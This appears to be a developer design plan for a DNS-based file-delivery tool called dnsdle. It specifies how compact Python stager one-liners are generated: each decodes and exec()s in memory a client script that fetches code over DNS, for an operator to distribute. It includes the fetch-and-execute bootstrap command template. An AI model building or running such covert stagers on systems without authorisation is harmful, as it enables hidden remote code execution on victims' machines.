# Plan: Phase 5 -- Stager Generation and Output

## Summary

Create the stager generation pipeline that produces compact Python
one-liners from the stager template, and integrate stager output into the
startup flow so the server emits pasteable bootstrap commands.

## Prerequisites

- Phase 2 (two-phase startup) must be complete. `build_startup_state()`
  must return the generation result containing client publish items.
- Phase 3 (stager template) must be complete. `build_stager_template()`
  is required.
- Phase 4 (stager minifier) must be complete. `minify()` is required.

## Goal

After implementation:

- The server outputs a compact Python one-liner per (source file,
  target_os) during startup.
- Each one-liner downloads the corresponding generated client script via
  DNS, verifies integrity, and `exec()`s it in memory.
- The one-liner is self-contained, self-extracting, valid ASCII, and
  works on both Linux and Windows.
- The operator fills in `RESOLVER` and `PSK` placeholders before
  distributing.

## Design

### 1. Stager generation module (`dnsdle/stager_generator.py`)

A new module exporting:

```python
def generate_stager(config, client_publish_item, target_os):
    """Generate a stager one-liner for a single client publish item.

    client_publish_item is the mapped PublishItem for the generated client
    script (from build_publish_items_from_sources in Phase 2).
    target_os is the target platform string from the generation artifact.

    Returns a dict with keys:
        "source_filename": str (client script filename, i.e.
            client_publish_item.source_filename)
        "target_os": str
        "oneliner": str (the pasteable command)
        "minified_source": str (for verification)
    """
```

**Pipeline (applied in order):**

1. **Substitute** embedded constants into the stager template from
   `build_stager_template()`. The constants come from `config`
   (`domain_labels_by_domain[0]` -- the label tuple for the
   lexicographically first domain, response_label, dns_max_label_len,
   dns_edns_size) and `client_publish_item` (file_tag, file_id,
   publish_version, total_slices, compressed_size, plaintext_sha256,
   slice_tokens). The `@@DOMAIN_LABELS@@` placeholder receives
   `config.domain_labels_by_domain[0]` (a tuple of labels), not the
   domain string.
2. **Verify** no unreplaced `@@PLACEHOLDER@@` markers remain.
3. **Minify** using `stager_minify.minify()`.
4. **Compile-check** the minified source with `compile()`.
5. **Compress** the minified source with `zlib.compress()`.
6. **Encode** the compressed bytes with `base64.b64encode()`.
7. **Verify ASCII:** the base64 payload must be valid ASCII.
8. **Round-trip verify:** `zlib.decompress(base64.b64decode(payload))`
   must equal the minified source bytes.
9. **Wrap** in a self-extracting bootstrap:
   ```
   python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('...')))" RESOLVER PSK
   ```
   `RESOLVER` and `PSK` are literal placeholder tokens.

**Error handling:** any verification failure raises `StartupError` with
phase `"startup"` and reason code `"stager_generation_failed"`.

### 2. Batch generation helper

```python
def generate_stagers(config, generation_result, client_publish_items):
    """Generate stagers for all (file, target_os) pairs.

    client_publish_items is the list of mapped PublishItem namedtuples
    for the generated client scripts (retained separately by
    build_startup_state() before merging into the combined set).

    Returns a list of stager dicts (one per artifact).
    """
```

This iterates the generation result artifacts and matches each to its
corresponding client publish item by comparing
`artifact["filename"]` to `client_publish_item.source_filename` (Phase 2
step 6 feeds `(artifact["filename"], artifact["source"].encode("ascii"))`
into `build_publish_items_from_sources()`, so the client publish item's
`source_filename` equals the artifact's `filename`). The artifact's own
`file_id`/`publish_version` refer to the user file it downloads, not to
the client script itself, so those fields must **not** be used as the
matching key. For each matched pair, calls `generate_stager(config,
client_publish_item, artifact["target_os"])`.

### 3. Integration into `build_startup_state()`

After Phase 2's combined RuntimeState is built:

1. Retain the client mapped publish items as a separate list before
   merging them into the combined set. Concretely: after Phase 2 step 9
   (`apply_mapping()` on the combined list), partition the mapped items
   back into user and client lists by matching `source_filename` against
   the generation result artifact filenames. Alternatively, keep the
   client publish items from Phase 2 step 7
   (`build_publish_items_from_sources()`) and re-apply mapping to just
   the client subset -- but the simpler approach is to retain the client
   items from the mapped combined output since they already carry
   `file_tag`, `slice_tokens`, and `slice_token_len`.
2. Call `generate_stagers()` with the config, generation result, and the
   client mapped publish items.
3. Return `(runtime_state, generation_result, stagers)` from
   `build_startup_state()`.

### 4. Stager output in `dnsdle.py`

After the existing generation and publish-item logging, emit one log
record per stager at `info` level, category `startup`:

```python
{
    "classification": "stager_ready",
    "phase": "startup",
    "reason_code": "stager_ready",
    "source_filename": stager["source_filename"],
    "target_os": stager["target_os"],
    "oneliner": stager["oneliner"],
}
```

The operator copies the `oneliner` value and fills in `RESOLVER` and `PSK`
before distributing.

### 5. One-liner format

```
python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('...')))" RESOLVER PSK
```

- The bootstrap wrapper is fixed overhead (~65 chars).
- The payload is opaque base64 which sidesteps shell quoting entirely --
  no quotes from the inner stager code can leak through.
- Double-quote wrapping is safe because the base64 payload contains no
  double quotes.
- Works on both Linux and Windows. On Windows the operator may need to
  replace `python3` with `python` depending on the target environment's
  Python installation.

## Affected Components

- `dnsdle/stager_generator.py` (NEW): stager generation pipeline.
  Exports `generate_stager()` and `generate_stagers()`. Performs constant
  substitution, minification, compression, encoding, verification, and
  wrapping.
- `dnsdle/__init__.py`: call `generate_stagers()` after building the
  combined RuntimeState. Return expanded tuple from
  `build_startup_state()`.
- `dnsdle.py`: unpack stagers from `build_startup_state()` return. Emit
  stager_ready log records.
- `dnsdle/constants.py`: add stager-related constants (placeholder token
  strings for RESOLVER/PSK if shared across modules).
- `unit_tests/test_startup_state.py`: unpack
  `(runtime_state, generation_result, stagers)` 3-tuple from
  `build_startup_state()`.
- `unit_tests/test_startup_convergence.py`: update stubs and assertions
  for the `(runtime_state, generation_result, stagers)` return tuple.
